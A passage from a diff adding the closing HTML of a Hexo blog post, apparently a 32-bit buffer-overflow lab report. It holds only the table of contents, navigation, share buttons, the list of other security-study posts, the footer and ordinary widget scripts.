+                    canary保护学习报告:通过字符串泄露canary
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/04/25/attqacklab/">
+                    attacklab实验报告:代码注入以及rop攻击
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level0-Candle"><span class="toc-number">1.</span> <span class="toc-text">level0:Candle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1-Sparkler"><span class="toc-number">2.</span> <span class="toc-text">level1:Sparkler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2-Firecracker"><span class="toc-number">3.</span> <span class="toc-text">level2:Firecracker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3-Dynamite"><span class="toc-number">4.</span> <span class="toc-text">level3:Dynamite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4-Nitroglycerin"><span class="toc-number">5.</span> <span class="toc-text">Level 4: Nitroglycerin</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"bufblab实验报告:32位程序缓冲区溢出攻击　| xia0ji233's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/" title="上一篇: canary保护学习报告:通过字符串泄露canary">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/04/25/attqacklab/" title="下一篇: attacklab实验报告:代码注入以及rop攻击">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/08/15/babyfengshui_33c3_2016%20writeup/">babyfengshui_33c3_2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/19/ret2dl_resolve/">ret2dl_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/">canary保护学习报告:通过字符串泄露canary</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">SROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/">2021华东南赛区国赛线下赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/08/axb_2019_fmt32%20wp/">axb_2019_fmt32 wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/">格式化字符串漏洞利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/cachelab/">cachelab实验报告:模拟cache的功能</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">动态调试工具的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/">系统调用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/">ret2libc实战</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">archlab实验报告：y86命令使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/08/RSA/">RSA解密</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/">红帽杯2019 easyRe</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">ret2libc学习报告</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/">canary保护学习报告:通过字符串泄露canary</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/30/buflab/">bufblab实验报告:32位程序缓冲区溢出攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/attqacklab/">attacklab实验报告:代码注入以及rop攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/19/bomblab/">bomblab实验报告:二进制安全与逆向分析</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021 xia0ji233
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
